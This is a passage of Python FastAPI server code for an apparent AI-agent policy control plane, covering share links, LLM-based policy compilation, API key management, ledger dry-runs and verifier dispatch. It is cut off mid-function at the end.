        """Owner-only: store a normalized edits overlay (range / hidden / redactions)."""
        from ..share.edits import normalize_edits

        try:
            body = await request.json()
        except Exception as exc:
            raise HTTPException(400, "body must be valid JSON") from exc
        if not isinstance(body, dict):
            raise HTTPException(400, "body must be an object")
        edits = normalize_edits(body.get("edits"))
        ok = share_repo.set_edits(token_hash, request.state.tenant_id, edits or None)
        if not ok:
            raise HTTPException(404, "not found or revoked")
        return {"edits": edits}

    @app.get("/v1/runs/share", dependencies=[Depends(require_tenant_auth)])
    def runs_share_list(request: Request) -> dict:
        """List the caller tenant's share links (manage UI). The cleartext token
        is NOT returned (only its hash is stored); the UI shows metadata +
        revoke, keyed by tokenHash."""
        rows = share_repo.list_by_tenant(request.state.tenant_id)
        now = int(time.time())
        items = []
        for r in rows:
            summary = r.view.get("summary") if isinstance(r.view, dict) else None
            summary = summary if isinstance(summary, dict) else {}
            revoked = r.revoked_at is not None
            expired = r.expires_at is not None and r.expires_at <= now
            items.append({
                "tokenHash": r.token_hash,
                "title": summary.get("title") or summary.get("goal") or None,
                "status": summary.get("status"),
                "createdAt": r.created_at,
                "expiresAt": r.expires_at,
                "revokedAt": r.revoked_at,
                "active": not revoked and not expired,
            })
        return {"items": items}

    @app.post(
        "/v1/runs/share/{token_hash}/revoke",
        dependencies=[Depends(require_tenant_auth)],
    )
    def runs_share_revoke(token_hash: str, request: Request) -> dict:
        ok = share_repo.revoke_by_hash(token_hash, request.state.tenant_id)
        if not ok:
            raise HTTPException(404, "not found or already revoked")
        return {"revoked": True}

    @app.post("/policies/compile", dependencies=[Depends(require_admin_key)])
    async def policies_compile(req: "CompileReq", request: Request) -> dict:
        """Authoring gate 1+2 — NL→IR compile + critic review.

        Returns {"ir": {...}, "review": {"ok": bool, "issues": [...]}}.
        NEVER persists. Gate 3 (human approval) is the dashboard editing the
        IR if needed and calling PUT /policies/{id}.

        v2.0-W5: runs via asyncio.to_thread so the sync httpx-based providers
        don't block the FastAPI event loop during the 5–60s LLM call.

        Q97a: providers are resolved from `app.state` first so the
        /admin/llm-keys PUT route's hot-reload takes effect on the very
        next call; the closure vars stay as the construct-time default.
        """
        active_compiler = getattr(request.app.state, "llm_compiler", None) or llm_compiler
        active_reviewer = getattr(request.app.state, "llm_reviewer", None) or llm_reviewer
        if active_compiler is None or active_reviewer is None:
            raise HTTPException(
                503, "LLM providers not configured on this deployment",
            )
        from .nl_compiler import PrecheckError, compile_with_review
        try:
            result = await asyncio.to_thread(
                compile_with_review,
                compiler=active_compiler,
                reviewer=active_reviewer,
                nl=req.nl,
                prior_turns=[t.model_dump() for t in (req.prior_turns or [])],
                verifier_registry=verifier_registry,
            )
        except PrecheckError as e:
            raise HTTPException(422, f"precheck: {e}") from e
        except ValueError as e:
            # compiler parse error — operator's prompt or model produced
            # something non-JSON. 422 because the input could be reformulated.
            raise HTTPException(422, str(e)) from e
        # D57e P1: surface descriptor lifecycle drift on the compile
        # response so the dashboard's compile preview can flag the
        # mismatch BEFORE the operator clicks Save (which would 422 at
        # PUT anyway). Annotates the existing `schema_issues` list
        # with structured drift records so the existing renderer
        # (`schema_issues: list[str | dict]`) can pick them up.
        try:
            from ..verifier.descriptors import (
                validate_policy_against_descriptors,
            )
            ir = result.get("ir") or {}
            trigger_event = ((ir.get("trigger") or {}).get("event") or "")
            if isinstance(trigger_event, str) and trigger_event:
                step_refs = [
                    r.get("step", "")
                    for r in (ir.get("requires") or [])
                    if isinstance(r, dict)
                    and r.get("kind") == "step"
                    and isinstance(r.get("step"), str)
                ]
                drift_issues = validate_policy_against_descriptors(
                    policy_id=str(ir.get("id") or "compiled-draft"),
                    trigger_event=trigger_event,
                    step_refs=step_refs,
                )
                if drift_issues:
                    existing_issues = list(result.get("schema_issues") or [])
                    for di in drift_issues:
                        existing_issues.append(
                            f"verifier {di['step']!r} does not fire on "
                            f"{di['trigger_event']!r}; allowed: "
                            f"{di['allowed_events']!r}"
                        )
                    result = dict(result)
                    result["schema_issues"] = existing_issues
        except Exception:  # pragma: no cover - defensive only
            pass
        return result

    @app.post("/policies/compile-interactive",
              dependencies=[Depends(require_admin_key)])
    async def policies_compile_interactive(
        req: "InteractiveCompileReq", request: Request,
    ) -> dict:
        """D55a — conversational policy compiler.

        Turn-by-turn variant of /policies/compile. Each call accepts the
        running history + draft + the user's most recent answers and
        returns the next conversational turn (assistant message + at
        most 2 clarifying questions + an updated draft).

        Stateless: every call reconstructs state from the request body.
        The CLIENT does not mutate the draft; only this endpoint writes
        to it (via the library module's `step_compile`).

        Same 503-on-unconfigured-provider shape as /policies/compile so
        the dashboard's existing provider_unconfigured flash mapping
        lights up without a second code path.

        Q97a: provider resolved from `app.state` first so a key change
        via /admin/llm-keys PUT takes effect on the very next call.
        """
        active_compiler = getattr(request.app.state, "llm_compiler", None) or llm_compiler
        if active_compiler is None:
            raise HTTPException(
                503, "LLM providers not configured on this deployment",
            )
        from ..policy.nl_compiler_interactive import (
            InteractiveInputError, step_compile,
        )
        from .nl_compiler import PrecheckError
        history = [t.model_dump() for t in (req.history or [])]
        try:
            return await asyncio.to_thread(
                step_compile,
                active_compiler,
                history=history,
                draft_so_far=req.draft_so_far,
                answers=req.answers,
            )
        except InteractiveInputError as e:
            raise HTTPException(422, str(e)) from e
        except PrecheckError as e:
            raise HTTPException(422, f"precheck: {e}") from e
        except ValueError as e:
            # LLM produced something that didn't parse as JSON — same
            # 422 as /policies/compile so the dashboard renders the same
            # actionable banner.
            raise HTTPException(422, str(e)) from e

    @app.post("/policies/handoff-context",
              dependencies=[Depends(require_admin_key)])
    async def policies_handoff_context(
        req: "HandoffContextReq",
    ) -> dict:
        """D57g — handoff to conversational from any authoring screen.

        Takes a snapshot of the wizard's URL state and / or the raw
        editor's IR draft and returns the same wire shape
        `step_compile` emits. The conversational client mounts the
        response as the first assistant turn instead of the canned
        intro, so the operator picks up where they left off in chat
        form.

        OFFLINE: no LLM call. The first real conversational turn (the
        operator's reply to this seeded summary) runs through
        `step_compile` as usual.
        """
        from ..policy.handoff_context import (
            HandoffContextError, build_handoff_turn,
        )
        try:
            return await asyncio.to_thread(
                build_handoff_turn,
                wizard_state=req.wizard_state,
                draft_ir=req.draft_ir,
                origin=req.origin,
                locale_hint=req.locale,
            )
        except HandoffContextError as e:
            raise HTTPException(422, str(e)) from e

    # ── Q97a: LLM API key dashboard surface ─────────────────────────
    # Self-host operators paste keys into /settings instead of editing
    # `~/.magi-cp/.env`. The PUT route hot-reloads the provider
    # singletons in-place so the next /policies/compile-interactive
    # picks them up WITHOUT a container restart.
    #
    # Body models live at module scope (LlmKeysPutReq / LlmKeysTestReq)
    # because FastAPI's `get_type_hints` cannot resolve forward refs to
    # classes defined inside the create_app closure on Python 3.14.

    def _llm_status_payload() -> dict:
        from .llm_key_store import status as _status
        s = _status()
        return {
            "anthropic": {
                "set": s["anthropic_set"],
                "last4": s["anthropic_last4"],
            },
            "openai": {
                "set": s["openai_set"],
                "last4": s["openai_last4"],
            },
        }

    def _rebuild_provider_singletons() -> None:
        """Re-resolve `app.state.llm_compiler` / `app.state.llm_reviewer`
        from the env-pointed factories. The factories now consult the
        on-disk overlay first, so the very next /policies/compile call
        uses the just-written keys.

        Either env var being unset leaves the corresponding singleton at
        None (matches the pre-Q97a 503-on-unconfigured behaviour); the
        admin endpoint's response will reflect the same `set=False`
        status the dashboard reads on GET.

        Errors raised by the factory itself (e.g. the provider's
        `__init__` rejecting a still-missing key) propagate up so the
        PUT response surfaces "you set anthropic but the openai factory
        is still missing its key" instead of silently rolling back.
        """
        try:
            app.state.llm_compiler = _resolve_llm_provider_from_env(
                "MAGI_CP_LLM_COMPILER",
            )
        except Exception:
            # Don't take the app down — keep the existing singleton, but
            # surface the failure as None so the dashboard can render
            # an actionable "provider error" pill.
            app.state.llm_compiler = None
        try:
            app.state.llm_reviewer = _resolve_llm_provider_from_env(
                "MAGI_CP_LLM_REVIEWER",
            )
        except Exception:
            app.state.llm_reviewer = None

    @app.get("/admin/llm-keys", dependencies=[Depends(require_admin_key)])
    def admin_llm_keys_get() -> dict:
        """Dashboard reads which providers are configured + last4.
        Never returns the raw key value — only `set: bool` and the last
        4 characters for a "yes this is the key I just pasted" check."""
        return _llm_status_payload()

    @app.put("/admin/llm-keys", dependencies=[Depends(require_admin_key)])
    async def admin_llm_keys_put(req: LlmKeysPutReq) -> dict:
        """Dashboard writes new keys.

        Both fields optional on the body. Missing field = preserve.
        Empty string = clear. Non-empty = overwrite. Atomic write via
        tempfile + rename; final file is 0600.

        After persisting, the provider singletons on `app.state` are
        rebuilt in-place so the very next /policies/compile call uses
        the new credentials without a container restart.
        """
        from .llm_key_store import set as _store_set
        async with llm_keys_lock:
            await asyncio.to_thread(
                _store_set, req.anthropic_api_key, req.openai_api_key,
            )
            _rebuild_provider_singletons()
        return _llm_status_payload()

    @app.post(
        "/admin/llm-keys/test",
        dependencies=[Depends(require_admin_key)],
    )
    async def admin_llm_keys_test(
        request: Request,
        req: LlmKeysTestReq = Body(default_factory=LlmKeysTestReq),
    ) -> dict:
        """One cheap "ping" completion per provider to verify the keys.

        With `{"provider": "anthropic"|"openai"}` the route exercises
        just that side. Without a body (or with `{"provider": null}`)
        both are run and a per-provider result map is returned.

        Each probe sends `[user: "ping"]` with a 4-token cap. On
        success: `{"ok": true, "error": null, "provider_used": "..."}`.
        On failure: `{"ok": false, "error": "<reason>", ...}`. A
        provider that isn't configured at all reports `{"ok": false,
        "error": "not configured", ...}` so the dashboard renders a
        consistent state.

        Runs in a thread so the live HTTP call doesn't block the loop.
        """
        which = req.provider if req else None

        def _one(provider_name: str) -> dict:
            singleton = (
                getattr(app.state, "llm_compiler", None)
                if provider_name == "anthropic"
                else getattr(app.state, "llm_reviewer", None)
            )
            if singleton is None:
                # Best-effort: try to construct a fresh provider directly
                # so an operator who has set keys but hasn't restarted
                # gets a real probe instead of a stale "not configured".
                try:
                    if provider_name == "anthropic":
                        from ..llm.anthropic_provider import AnthropicProvider
                        singleton = AnthropicProvider()
                    else:
                        from ..llm.openai_provider import OpenAIProvider
                        singleton = OpenAIProvider()
                except Exception as e:
                    return {
                        "ok": False,
                        "error": f"not configured: {type(e).__name__}: {e}",
                        "provider_used": provider_name,
                    }
            try:
                singleton.complete([
                    {"role": "user", "content": "ping"},
                ])
            except Exception as e:
                return {
                    "ok": False,
                    "error": f"{type(e).__name__}: {e}",
                    "provider_used": provider_name,
                }
            return {
                "ok": True,
                "error": None,
                "provider_used": provider_name,
            }

        if which in ("anthropic", "openai"):
            return await asyncio.to_thread(_one, which)
        # both
        a = await asyncio.to_thread(_one, "anthropic")
        o = await asyncio.to_thread(_one, "openai")
        return {"anthropic": a, "openai": o}

    @app.post("/policies/dry-run", dependencies=[Depends(require_admin_key)])
    async def policies_dry_run(req: "DryRunReq", request: Request) -> dict:
        """D53b: replay a draft IR over the last 24h / 7d of ledger
        rows and report how many would have triggered the policy
        action.

        Read-only. POST is used because the IR body is non-trivial
        (would not fit in a query string), but nothing is persisted -
        no ledger append, no HITL enqueue, no policy write.

        Validation reuses `_deserialize_policy_from_api` so the same
        archetype + matrix checks that gate PUT /policies also gate
        this surface. A draft that fails to validate returns 422 with
        the validation error message - exactly what the authoring
        page already knows how to render.

        Sample payloads in the response pass through D50's
        `redact_payload_preview` (allowlist projection + linear
        masking) - raw evidence bodies never reach the dashboard.

        P1 follow-up: async + asyncio.to_thread so the threadpool
        does not pin on a 10_000-row Python replay (mirrors the
        `policies_compile` route above which already does this for
        the same long-blocking-call reason).
        """
        from ..policy.dry_run import evaluate_dry_run
        from ..policy.run_redaction import (
            DEFAULT_PREVIEW_MAX_CHARS, redact_payload_preview,
        )
        from ..policy.verdicts import LEDGER_VERDICTS
        from .tenants import Tenant

        # Gate 1: shape check. Reuse the policies CRUD deserializer
        # so an authoring-time validation failure here mirrors the
        # one the operator would have seen on PUT. The Policy
        # dataclass's __post_init__ raises ValueError on any matrix
        # / regex / SHACL lint failure.
        try:
            policy = _deserialize_policy_from_api(req.ir)
        except (ValueError, KeyError) as e:
            raise HTTPException(422, str(e)) from e

        # Gate 2: tenancy resolution. The route is admin-key gated
        # (require_tenant_auth has NOT run), so request.state.tenant_id
        # is never set; falling back to "default" produces a
        # silently-wrong count on every multi-tenant deployment.
        # Accept an explicit `tenant_id` field on the request and
        # validate it. When the tenants table is empty (single-tenant
        # deployment) we accept the "default" synthetic; when the
        # table has rows we 422 on an omitted or unknown id.
        engine = request.app.state.engine
        from sqlalchemy import select as _select
        from sqlalchemy.orm import Session as _Session
        with _Session(engine) as _s:
            has_tenants = _s.scalars(
                _select(Tenant.id).limit(1)
            ).first() is not None
        if req.tenant_id is not None:
            with _Session(engine) as _s:
                exists = _s.scalars(
                    _select(Tenant.id).where(Tenant.id == req.tenant_id)
                ).first() is not None
            if not exists:
                raise HTTPException(
                    422, f"unknown tenant_id: {req.tenant_id!r}",
                )
            tenant_id = req.tenant_id
        elif has_tenants:
            raise HTTPException(
                422,
                "tenant_id is required on multi-tenant deployments "
                "(POST /policies/dry-run is admin-key gated and has "
                "no per-request tenant resolution)",
            )
        else:
            tenant_id = "default"

        # Gate 3: ledger window. `since` is a closed enum to keep
        # the replay's blast radius bounded (a typo cannot widen to
        # 90d). Limit is clamped by pydantic above (1..10_000).
        window_secs = {"24h": 86_400, "7d": 7 * 86_400}[req.since]
        cutoff = int(time.time()) - window_secs
        rows = await asyncio.to_thread(
            ledger.list_recent_window,
            tenant_id, limit=req.limit, since_ts=cutoff,
        )

        # Gate 4: pure replay. Push the per-row Python loop onto the
        # threadpool too - regex compile + payload-text projection
        # across 10_000 rows can run >100ms which would still wedge
        # the event loop.
        result = await asyncio.to_thread(
            evaluate_dry_run, policy, rows, sample_limit=3,
        )

        # Build the redacted sample list. Look the matched rows back
        # up by id from the already-hydrated `rows` window so we do
        # not need a second SQL round-trip. The redactor is
        # fail-closed; an unexpected future body field with a secret
        # cannot leak through this surface. The verdict allowlist is
        # the single-source-of-truth constant in
        # magi_cp.policy.verdicts; widening the closed set is a
        # one-line change there.
        rows_by_id = {r.id: r for r in rows}
        sample_matched: list[dict] = []
        for rid in result.sample_matched_ids:
            r = rows_by_id.get(rid)
            if r is None:
                continue
            body = r.body if isinstance(r.body, dict) else {}
            verdict_raw = body.get("verdict")
            verdict = (
                verdict_raw
                if isinstance(verdict_raw, str)
                and verdict_raw in LEDGER_VERDICTS
                else None
            )
            sample_matched.append({
                "id": r.id,
                "ts": _iso_ts(r.ts),
                "verdict": verdict,
                "redacted_payload_preview": redact_payload_preview(
                    body, max_chars=DEFAULT_PREVIEW_MAX_CHARS,
                ),
            })

        return {
            "total_records": result.total_records,
            "matched": result.matched,
            "indeterminate": result.indeterminate,
            "by_verdict": result.by_verdict,
            "by_action": result.by_action,
            "sample_matched": sample_matched,
            "skipped_reason": result.skipped_reason,
            "skipped_kinds": result.skipped_kinds,
            "since": req.since,
            "limit": req.limit,
            "tenant_id": tenant_id,
        }

    @app.get("/pubkey")
    def get_pubkey() -> dict:
        """v2.0-W7b: multi-key aware. `kid` and `pubkey_pem` describe the
        ACTIVE signing key (back-compat with single-key clients). `keys` is
        a {kid: pubkey_pem} map of every key the cloud will verify against,
        so clients holding a token signed by a prior (rotated-out) key can
        still verify until that key is revoked."""
        return {
            "kid": ks.active_kid(),
            "pubkey_pem": ks.public_pem(),
            "keys": ks.public_pem_map(),
        }

    # ── v2.2: tenant identity (alpha-signup retired; tenants now provisioned
    #         by Clawy Pro+ Stripe webhook hitting /admin/tenants) ───────
    @app.get("/tenants/me", dependencies=[Depends(require_tenant_auth)])
    def get_my_tenant(request: Request) -> dict:
        """Authenticated user fetches their own tenant info — used by the
        /setup wizard. Returns just enough for the dashboard to render
        identity + plan + active status; no other tenants' data."""
        from .tenants import TenantRepo
        repo = TenantRepo(engine)
        tenant_id = getattr(request.state, "tenant_id", "default")
        if tenant_id == "default":
            # Codex runtime adapter (P4): surface the runtime even for the
            # synthetic default tenant so the dashboard picker reflects a
            # prior switch. ``get_runtime`` returns "claude-code" until a
            # row is materialized by the runtime picker.
            return {"id": "default", "status": "active", "plan": "free",
                    "expires_at": None, "synthetic": True,
                    "runtime_id": repo.get_runtime("default")}
        t = repo.get(tenant_id)
        if t is None:
            raise HTTPException(404, "tenant not found")
        return {
            "id": t.id, "status": t.status, "plan": t.plan,
            "expires_at": t.expires_at, "synthetic": False,
            "runtime_id": repo.get_runtime(tenant_id),
        }

    @app.get("/verifiers")
    @app.get("/presets")  # alias kept for the existing /presets dashboard route
    def get_verifiers(request: Request) -> dict:
        """Merge built-in VerifierRegistry + tenant-scoped custom verifiers
        + vendored magi-agent catalog (preview). Read-only.

        Sort: wired built-ins first, then custom (per-tenant), then vendor
        preview entries (no implementation behind them).

        Auth: optional. If the request carries a valid tenant key, custom
        verifiers for that tenant are merged in (via require_tenant_auth's
        side effect of setting request.state.tenant_id). Without auth we
        return the global view only.
        """
        wired: list[dict] = []
        seen_ids: set[str] = set()
        if verifier_registry is not None:
            for v in verifier_registry.all():
                pid = v.step.replace("_", "-")
                wired.append({
                    "id": pid,
                    "category": v.category,
                    "description": v.description,
                    "enforcement": v.enforcement.value,
                    "step": v.step,
                    "input_schema": getattr(v, "input_schema", None),
                    "name": getattr(v, "name", None),
                })
                seen_ids.add(pid)

        # Tenant-scoped custom verifiers. Auth on this route is optional —
        # require_tenant_auth has NOT run, so we read the api key header
        # directly and resolve the tenant ourselves; missing / invalid
        # falls through to "no custom rows" (consistent with the prior
        # pre-D52b global view).
        custom: list[dict] = []
        try:
            tenant_id = _resolve_tenant_id_from_request(request)
        except Exception:
            tenant_id = None
        if tenant_id is not None:
            for cv in custom_verifier_store.list_for_tenant(tenant_id):
                custom.append({
                    "id": cv.id,
                    "category": None,
                    "description": cv.description,
                    "enforcement": "preview",
                    "step": cv.name,
                    "input_schema": None,
                    "name": cv.name,
                    "source": "custom",
                })

        vendor = sorted(
            (
                {
                    "id": vp.id,
                    "category": vp.category,
                    "description": vp.description,
                    "enforcement": "preview",
                    "step": None,
                    "input_schema": None,
                    "name": None,
                }
                for vp in vendor_catalog()
                if vp.id not in seen_ids   # wired ID shadows vendor entry
            ),
            key=lambda p: p["id"],
        )
        return {"presets": wired + custom + vendor}

    @app.post("/verify/{step}", dependencies=[Depends(require_tenant_auth)])
    async def verify_dispatch(step: str, req: VerifyDispatchReq, request: Request) -> dict:
        # W8b: per-request metric timing.
        from .observability import get_metric
        _t0 = time.perf_counter()
        result: dict = {"verdict": "error", "token": None}
        tid_for_metric = getattr(request.state, "tenant_id", "default")
        try:
            result = await _verify_dispatch_impl(step, req, request)
            return result
        finally:
            _vt = get_metric("verify_total")
            if _vt is not None:
                try:
                    _vt.labels(step=step, verdict=result.get("verdict", "error"),
                                tenant_id=tid_for_metric).inc()
                except Exception:
                    pass
            _vl = get_metric("verify_latency_seconds")
            if _vl is not None:
                try:
                    _vl.labels(step=step).observe(time.perf_counter() - _t0)
                except Exception:
                    pass

    async def _verify_dispatch_impl(step: str, req: VerifyDispatchReq, request: Request) -> dict:
        """Generic verifier dispatch — any registered verifier other than
        citation_verify (which keeps its specialized NLI+ledger path).

        Pass: signed token + ledger entry.
        Deny: no token, ledger entry records the deny.
        Review: signed token with hitl flag in body so the gate routes to HITL.
        """
        if verifier_registry is None:
            raise HTTPException(503, "verifier registry not configured")
        if step == "citation_verify":
            raise HTTPException(
                409,
                "use POST /citation_verify for citation_verify (specialized path)",
            )
        tenant_id = getattr(request.state, "tenant_id", "default")
        v = verifier_registry.get_by_step(step)
        if v is None:
            raise HTTPException(404, f"no verifier registered for step {step!r}")
        # PR4: subject/payload_hash are the only keys. Legacy mirror
        # fields removed from request validator (extra="forbid") and from
        # ledger bodies below.
        subj, phash = req.subject, req.payload_hash
        # D53b follow-up: frame metadata written to the ledger row body
        # so the offline dry-run replay can scope rows to the proposed
        # policy's (event, matcher) frame. Gates that haven't rolled
        # forward past the runtime-write contract simply omit these
        # fields; the dry-run will exclude such rows so total_records
        # reflects rows the replay COULD scope, not "every tenant row
        # in window."
        frame_meta = _frame_meta_for_ledger(req.hook_event, req.matcher)
        try:
            verdict = v.run(req.payload)
        except Exception as e:
            # Verifier blew up on a malformed payload → treat as deny, record.
            async with chain_lock:
                ledger.append(subject=subj,
                              body={**frame_meta,
                                    "step": step, "verdict": "deny",
                                    "subject": subj, "payload_hash": phash,
                                    "error": str(e)[:200]},
                              token="", tenant_id=tenant_id)
            return {"verdict": "deny", "token": None,
                    "reasons": [f"verifier error: {type(e).__name__}"]}
        if verdict.status == "pass":
            async with chain_lock:
                result = _issue_token(
                    subj, phash, "pass",
                    ledger=ledger, keystore=ks, kid=kid, step=step,
                    tenant_id=tenant_id,
                    ledger_extra=frame_meta or None,
                )
            result["reasons"] = list(verdict.reasons)
            return result
        if verdict.status == "review":
            async with chain_lock:
                result = _issue_token(
                    subj, phash, "review",
                    ledger=ledger, keystore=ks, kid=kid, step=step,
                    tenant_id=tenant_id,
                    ledger_extra=frame_meta or None,
                )
            result["reasons"] = list(verdict.reasons)
            return result
        # deny
        async with chain_lock:
            ledger.append(subject=subj,
                          body={**frame_meta,
                                "step": step, "verdict": "deny",
                                "subject": subj, "payload_hash": phash,
                                "reasons": list(verdict.reasons)},
                          token="", tenant_id=tenant_id)
        return {"verdict": "deny", "token": None,
                "reasons": list(verdict.reasons)}

    # ── D35: inline EvidenceReq dispatch (regex/llm_critic/shacl) ──
    # Path uses an underscore so it doesn't collide with the
    # `/verify/{step}` wildcard registered above (which would otherwise
    # capture "inline" as the step name).
    @app.post("/verify_inline", dependencies=[Depends(require_tenant_auth)])
    async def verify_inline(req: VerifyInlineReq, request: Request) -> dict:
        """Dispatch a non-step EvidenceReq evaluated in-cloud.

        regex      — pure stdlib, fully wired.
        llm_critic — uses MAGI_CP_LLM_COMPILER provider when configured;
                     returns "review" with a preview reason otherwise.
        shacl      — uses pyshacl when installed; otherwise "review"
                     preview with import-failure reason.

        All three paths append to the audit ledger on pass/deny so the
        catalog endpoint and downstream HITL queue see the same shape
        as step-kind dispatch.
        """
        tenant_id = getattr(request.state, "tenant_id", "default")
        kind = req.kind
        step_label = f"inline_{kind}"
        # Pull the text-typed slice of payload for regex / llm_critic;
        # SHACL works on the dict shape directly. Delegated to the
        # shared `payload_projection` module so /verify_inline,
        # `dry_run`, and the synthetic `test_runner` simulator all
        # project the same payload to the same string.
        from magi_cp.policy.payload_projection import (
            FIELD_MISSING,
            project_payload_for_regex,
            resolve_field_for_regex,
        )
        payload_text = project_payload_for_regex(req.payload)

        verdict_status: str = "deny"
        reasons: list[str] = []
        if kind == "regex":
            if not req.pattern:
                raise HTTPException(422, "kind=regex requires pattern")
            try:
                rx = re.compile(req.pattern)
            except re.error as e:
                raise HTTPException(422, f"pattern fails to compile: {e}")
            # D82c fix: when the caller scopes the match to a specific
            # dotted path, resolve the field BEFORE running re.search.
            # Without this, an operator who picks `tool_response.output`
            # with pattern `\bSSN\b` would match an SSN appearing in
            # `tool_input.command` / `tool_input.description` /
            # anywhere else in the payload (overmatch / fail-OPEN).
            if req.field_path:
                resolved = resolve_field_for_regex(
                    req.payload, req.field_path,
                )
                if resolved is FIELD_MISSING:
                    # Field absent on this payload → cannot match. Deny
                    # with a clear reason instead of silently scanning
                    # the whole payload.
                    scoped_text = ""
                    verdict_status = "deny"
                    reasons = [
                        f"pattern did not match: field {req.field_path!r} "
                        f"absent from payload",
                    ]
                else:
                    assert isinstance(resolved, str)
                    scoped_text = resolved
                    if rx.search(scoped_text):
                        verdict_status = "pass"
                        reasons = [
                            f"pattern matched on {req.field_path}: "
                            f"{req.pattern[:80]}",
                        ]
                    else:
                        verdict_status = "deny"
                        reasons = [
                            f"pattern did not match on {req.field_path}: "
                            f"{req.pattern[:80]}",
                        ]
                # Persist the scoped projection so the offline dry-run
                # replay scans the SAME text the runtime scanned.
                payload_text = scoped_text
            else:
                if rx.search(payload_text):
                    verdict_status = "pass"
                    reasons = [f"pattern matched: {req.pattern[:80]}"]
                else:
                    verdict_status = "deny"
                    reasons = [f"pattern did not match: {req.pattern[:80]}"]
        elif kind == "llm_critic":
            if not req.criterion:
                raise HTTPException(422, "kind=llm_critic requires criterion")
            # Q97a: prefer the hot-reloadable singleton on app.state so a
            # /admin/llm-keys PUT-triggered rebuild reaches this path too.
            active_compiler = getattr(request.app.state, "llm_compiler", None) or llm_compiler
            if active_compiler is None:
                verdict_status = "review"
                reasons = [
                    "llm_critic preview: MAGI_CP_LLM_COMPILER not configured — "
                    "policy authored but runtime evaluation deferred to HITL.",
                ]
            else:
                # D82c: substitute `{field.path}` markers in the criterion
                # with values lifted from the live CC stdin payload BEFORE
                # the prompt reaches the LLM. Missing paths render as
                # `(no <field_path> available)` so the prose stays
                # grammatical instead of leaking literal `{...}` braces.
                from magi_cp.policy.payload_schemas import (
                    interpolate_payload_markers,
                )
                resolved_criterion = interpolate_payload_markers(
                    req.criterion, req.payload,
                )
                # Lightweight one-call yes/no critic. The compiler-side
                # provider already handles auth + timeout; we use it for
                # judgment too.
                prompt = (
                    "You are a strict gate. Reply with exactly YES or NO on "
                    "the first line, then a one-sentence rationale.\n\n"
                    f"CRITERION: {resolved_criterion}\n\n"
                    f"PAYLOAD:\n{payload_text[:4000]}"
                )
                try:
                    raw = await asyncio.to_thread(
                        active_compiler.complete, prompt,
                        max_output_tokens=200,
                    )
                except Exception as e:
                    verdict_status = "deny"
                    reasons = [f"llm_critic provider error: {type(e).__name__}"]
                else:
                    head = (raw or "").strip().split("\n", 1)[0].strip().upper()
                    if head.startswith("YES"):
                        verdict_status = "pass"
                        reasons = [f"llm_critic YES — {raw[:200]}"]
                    else:
                        verdict_status = "deny"
                        reasons = [f"llm_critic NO — {raw[:200]}"]
        elif kind == "shacl":
            if not req.shape_ttl:
                raise HTTPException(422, "kind=shacl requires shape_ttl")
            try:
                import pyshacl
                import rdflib  # type: ignore[import-not-found]
            except ImportError:
                verdict_status = "review"
                reasons = [
                    "shacl preview: pyshacl not installed — install the [shacl] "
                    "extra to enable runtime validation.",
                ]
            else:
                try:
                    # P7 (issue #1, P0 #1): lift the CC hook payload
                    # fields the chip menu advertises into RDF triples
                    # BEFORE pyshacl runs. Without this, a shape
                    # targeting `magi:tool_input.command` finds zero
                    # focus nodes at runtime → pyshacl conforms →
                    # silent fail-open. With this lift, a chip-picked
                    # path resolves to exactly one focus node per hook
                    # firing.
                    #
                    # The /verify_inline shape of the payload differs
                    # from the raw CC stdin (callers wrap it under
                    # `tool_input` keys etc.); we accept either shape:
                    #   - direct CC payload  → lifted to triples
                    #   - {"evidence_ttl": "..."} → kept for back-compat
                    #     so existing legal-vertical shapes still work
                    from ..policy.payload_schemas import (
                        lift_payload_to_data_graph,
                    )
                    # The runtime doesn't know which (event, matcher)
                    # this verify-call came from at the /verify_inline
                    # surface — gate.py passes the payload through
                    # verbatim. We accept hints in the payload itself
                    # under reserved keys (`__event__`, `__matcher__`)
                    # so the gate can opt in; without them we lift
                    # under the most permissive (PreToolUse, *) frame.
                    ev_hint = req.payload.get("__event__") if isinstance(req.payload, dict) else None
                    mt_hint = req.payload.get("__matcher__") if isinstance(req.payload, dict) else None
                    payload_for_lift = {
                        k: v for k, v in (req.payload.items() if isinstance(req.payload, dict) else [])
                        if k not in ("__event__", "__matcher__")
                    }
                    data = lift_payload_to_data_graph(
                        payload_for_lift,
                        event=str(ev_hint) if isinstance(ev_hint, str) else "PreToolUse",
                        matcher=str(mt_hint) if isinstance(mt_hint, str) else None,
                    )
                    # Back-compat: callers carrying a legal-vertical
                    # `evidence_ttl` Turtle blob get it merged onto the
                    # same data graph so existing shapes keep working.
                    ev_ttl = req.payload.get("evidence_ttl") if isinstance(req.payload, dict) else None
                    if isinstance(ev_ttl, str):
                        data.parse(data=ev_ttl, format="turtle")
                    conforms, _, results_text = pyshacl.validate(
                        data, shacl_graph=req.shape_ttl,
                        inference="none", advanced=False,
                    )
                    # P0 #1 second half: a shape that finds zero focus
                    # nodes "conforms" per the SHACL spec — vacuous
                    # satisfaction. We re-frame that as deny so a
                    # mis-targeted shape stops failing open silently.
                    # Heuristic: pyshacl's `conforms=True` with zero
                    # focus nodes triggered by the shape graph means
                    # the shape didn't even reach the data; we
                    # confirm this by extracting target IRIs and
                    # checking that AT LEAST ONE is present in the
                    # data graph.
                    if conforms:
                        from ..policy.payload_schemas import (
                            MAGI_HOOK_NS, extract_targets,
                        )
                        targets = extract_targets(req.shape_ttl)
                        # Determine if the shape has ANY focus-node
                        # selector (sh:targetNode / sh:targetClass).
                        # sh:path is a constraint detail, not an
                        # anchor — a shape can include sh:path with
                        # no targets and that's a constraint shape
                        # invoked by something else; we don't treat
                        # paths as anchors for the vacuous check.
                        anchored = bool(targets["targetNode"] or targets["targetClass"])
                        if anchored:
                            ns = rdflib.Namespace(MAGI_HOOK_NS)
                            present = False
                            for ln in targets["targetNode"]:
                                if (ns[ln], None, None) in data or (None, None, ns[ln]) in data:
                                    present = True
                                    break
                            if not present:
                                for ln in targets["targetClass"]:
                                    if (None, rdflib.RDF.type, ns[ln]) in data:
                                        present = True
                                        break
                            if not present:
                                verdict_status = "deny"
                                reasons = [
                                    "shacl vacuous: shape anchored on a "
                                    "node/class the runtime did not "
                                    "materialize (0 focus nodes). Pick "
                                    "a field from the wizard chip menu "
                                    "or sh:targetClass magi:Hook.",
                                ]
                            else:
                                verdict_status = "pass"
                                reasons = ["shacl conforms"]
                        else:
                            verdict_status = "pass"
                            reasons = ["shacl conforms"]
                    else:
                        verdict_status = "deny"
                        reasons = [f"shacl violation: {str(results_text)[:240]}"]
                except Exception as e:
                    verdict_status = "deny"
